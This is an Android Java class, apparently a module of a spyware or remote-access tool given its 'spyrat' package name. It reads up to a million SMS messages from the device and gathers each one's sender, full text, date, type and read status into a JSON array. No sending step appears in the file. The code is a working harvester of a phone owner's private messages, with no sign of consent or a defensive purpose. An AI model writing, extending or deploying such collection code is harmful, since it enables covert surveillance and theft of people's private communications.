package com.spyrat.investigation;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

public class RealSmsCollector {
    private static final String TAG = "RealSmsCollector";
    private Context context;

    public RealSmsCollector(Context context) {
        this.context = context;
    }

    public JSONArray getSMSMessages() {
        JSONArray smsList = new JSONArray();
        Cursor cursor = null;
        
        try {
            Log.d(TAG, "📱 Starting SMS collection...");
            
            Uri uri = Uri.parse("content://sms");
            String[] projection = new String[]{
                "_id", "address", "body", "date", "type", "read"
            };
            
            cursor = context.getContentResolver().query(uri, projection, null, null, "date DESC LIMIT 1000000");
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    try {
                        JSONObject sms = new JSONObject();
                        sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                        sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                        sms.put("date", cursor.getLong(cursor.getColumnIndexOrThrow("date")));
                        sms.put("type", getMessageType(cursor.getInt(cursor.getColumnIndexOrThrow("type"))));
                        sms.put("read", cursor.getInt(cursor.getColumnIndexOrThrow("read")) == 1);
                        
                        smsList.put(sms);
                    } catch (Exception e) {
                        Log.e(TAG, "❌ Error parsing SMS: " + e.getMessage());
                    }
                } while (cursor.moveToNext());
            }
            
            Log.d(TAG, "✅ Collected " + smsList.length() + " SMS messages");
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ SMS permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "❌ SMS collection error: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return smsList;
    }
    
    private String getMessageType(int type) {
        switch (type) {
            case 1: return "INBOX";
            case 2: return "SENT";
            case 3: return "DRAFT";
            case 4: return "OUTBOX";
            case 5: return "FAILED";
            case 6: return "QUEUED";
            default: return "UNKNOWN";
        }
    }
}
